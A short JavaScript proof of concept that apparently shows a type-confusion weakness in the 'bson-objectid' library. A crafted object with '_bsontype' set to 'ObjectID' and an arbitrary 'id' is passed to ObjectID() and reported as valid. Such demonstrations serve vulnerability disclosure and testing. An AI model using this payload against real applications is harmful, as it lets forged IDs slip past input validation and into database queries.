const ObjectID = require("bson-objectid");

// Working Example
function workingDemo() {
    console.log(ObjectID("54495ad94c934721ede76d90"));
    console.log(ObjectID.isValid(ObjectID("54495ad94c934721ede76d90")));

    // Attack Example
    const payload = {
        "id": "BAD_ID",
        "hello": "world",
        "_bsontype": "ObjectID"
    };

    // console.log("here", ObjectID("54495ad94c934721ede76d90").equals(ObjectID(payload)))


    // console.log(ObjectID("54495ad94c934721ede76d90").id)


    console.log(ObjectID(payload).id)
    console.log(ObjectID(payload));
    console.log(ObjectID.isValid(ObjectID(payload)));


}

function jsonDemo(input) {
    return (ObjectID(input).id);
}

module.exports =
{
    jsonDemo
}